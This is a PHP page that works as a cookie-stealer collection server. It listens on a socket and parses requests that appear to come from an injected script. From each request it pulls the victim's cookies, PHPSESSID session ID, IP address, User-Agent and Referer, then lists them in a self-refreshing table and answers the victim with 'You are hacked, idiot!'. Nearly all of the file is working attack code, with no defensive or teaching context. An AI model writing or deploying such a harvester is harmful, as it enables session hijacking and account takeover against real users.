<html>
<head>
<style>
table, th, td {
  border: 1px solid black;
}
table.center {
  margin-left: auto;
  margin-right: auto;
}
</style>
</head>
<body>
<table class="center">
  <tr>
    <th>Date</th>
    <th>Cookie</th>
    <th>Session ID</th>
    <th>Client IP</th>
    <th>User-Agent</th>
    <th>Referrer</th>
  </tr>
<?php
header("Refresh: 0");
session_start();
$host = "127.0.0.1";
$port = 8888;
set_time_limit(0);

$server = socket_create(AF_INET, SOCK_STREAM, 0) or die("Could not create socket\n");


socket_bind($server,$host,$port) or die("Could not bind\n");
socket_listen($server,3) or die("Could not listen\n");

$client = socket_accept($server) or die("Could not accept\n");
$input = socket_read($client, 1024);
$input = trim($input);

$results = array( 0 => "date",
1 => "cookie",
2 => "sessionid",
3 => "clientip",
4 => "browser_os",
5 => "referrer" );

$results[0]=date("Y/m/d H:i:s");

$list = explode ("\n", $input);
$cookieEncoded=$list[0];

$size=count($list);
for($i=1;$i<$size;$i++){
    if(str_contains($list[$i],"User-Agent")){
        $results[4]=explode(":",$list[$i])[1];
    }
    else if(str_contains($list[$i],"Referer")){
        $results[5]=explode(":",$list[$i],2)[1];
    }
}

$cookie=explode(" ",$cookieEncoded)[1];
$cookie=urldecode(substr($cookie,7));

$cookieElements=explode(" ",$cookie);

$results[3]=explode("=",$cookieElements[0])[1];

$size=count($cookieElements);
$cookie="";
for($i=1;$i<$size;$i++){
    $cookie=$cookie.$cookieElements[$i];
    if($i!=$size-1){
        $cookie=$cookie."; ";
    }
    if(str_contains($cookieElements[$i],"PHPSESSID")){
        $results[2]=explode("=",$cookieElements[$i])[1];
    }
}

$results[1]=$cookie;

if(!isset($_SESSION['rows'])){
  $_SESSION['rows']="";
}

$_SESSION['rows']="<tr><td>".$results[0]."</td>".
                  "<td>".$results[1]."</td>".
                  "<td>".$results[2]."</td>".
                  "<td>".$results[3]."</td>".
                  "<td>".$results[4]."</td>".
                  "<td>".$results[5]."</td></tr>".$_SESSION['rows'];

echo $_SESSION['rows'];

$response="HTTP/1.0 200 OK\r\n\r\n<TITLE>Response</TITLE><P>You are hacked, idiot!</P>";
socket_write($client, $response,1024);

socket_close($client);
socket_close($server);
?>
</table>
</body>
</html>